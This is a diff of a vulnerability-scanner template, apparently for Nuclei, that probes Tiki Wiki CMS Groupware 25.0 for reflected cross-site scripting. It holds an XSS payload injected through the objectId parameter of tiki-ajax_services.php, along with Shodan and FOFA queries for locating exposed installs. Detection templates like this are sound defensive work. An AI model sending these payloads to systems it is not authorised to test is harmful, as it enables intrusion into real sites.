@@ -1,5 +1,4 @@
 id: tikiwiki-xss
-
 info:
   name: Tiki Wiki CMS Groupware v25.0 - Cross Site Scripting
   author: arafatansari
@@ -9,37 +8,33 @@ info:
   reference:
     - https://packetstormsecurity.com/files/170446/Tiki-Wiki-CMS-Groupware-25.0-Cross-Site-Scripting.html
   metadata:
-    verified: true
+    fofa-query: body="tiki wiki"
     max-request: 2
-    vendor: tiki
     product: tikiwiki_cms\/groupware
     shodan-query: http.html:"tiki wiki"
-    fofa-query: body="tiki wiki"
-  tags: edb,xss,tikiwiki,packetstorm,acketstorm,vuln
-
+    vendor: tiki
+    verified: true
+  tags: edb,packetstorm,tikiwiki,vuln,xss
 http:
-  - method: GET
-    path:
-      - "{{BaseURL}}/tiki/tiki-ajax_services.php?controller=comment&action=list&type=wiki+page&objectId=<script>alert(document.domain)</script>"
-      - "{{BaseURL}}/tiki-ajax_services.php?controller=comment&action=list&type=wiki+page&objectId=<script>alert(document.domain)</script>"
-
-    stop-at-first-match: true
-
-    matchers-condition: and
-    matchers:
-      - type: word
+  - matchers:
+      - condition: and
         part: body
+        type: word
         words:
-          - '<script>alert(document.domain)</script>'
-          - 'Tiki Wiki CMS'
-        condition: and
-
-      - type: word
-        part: header
+          - <script>alert(document.domain)</script>
+          - Tiki Wiki CMS
+      - part: header
+        type: word
         words:
-          - "text/html"
-
-      - type: status
-        status:
+          - text/html
+      - status:
           - 403
+        # digest: 4b0a00483046022100f03064a00be782642e014eea2d381a0684cc2fa02ec6b130df98da55cb4ccbe302210082652d86a5f7104e528b90512d0aedf9c1fdea01280414fe326cc2085d5826dd:922c64590222798bb761d5b6d8e72950
 
+        type: status
+    matchers-condition: and
+    method: GET
+    path:
+      - '{{BaseURL}}/tiki/tiki-ajax_services.php?controller=comment&action=list&type=wiki+page&objectId=<script>alert(document.domain)</script>'
+      - '{{BaseURL}}/tiki-ajax_services.php?controller=comment&action=list&type=wiki+page&objectId=<script>alert(document.domain)</script>'
+    stop-at-first-match: true
